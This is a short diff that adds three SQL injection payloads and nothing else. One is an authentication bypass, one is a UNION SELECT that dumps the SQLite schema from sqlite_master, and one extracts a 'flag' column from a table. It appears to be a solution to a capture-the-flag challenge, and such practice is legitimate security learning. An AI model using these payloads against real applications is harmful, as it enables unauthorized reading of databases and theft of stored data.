@@ -1,0 +1,5 @@
+'or 1=1;--
+
+Algiers' union select sql, 1, 1 from sqlite_master;--
+
+Algers' union select flag,id,1 from more_table;--
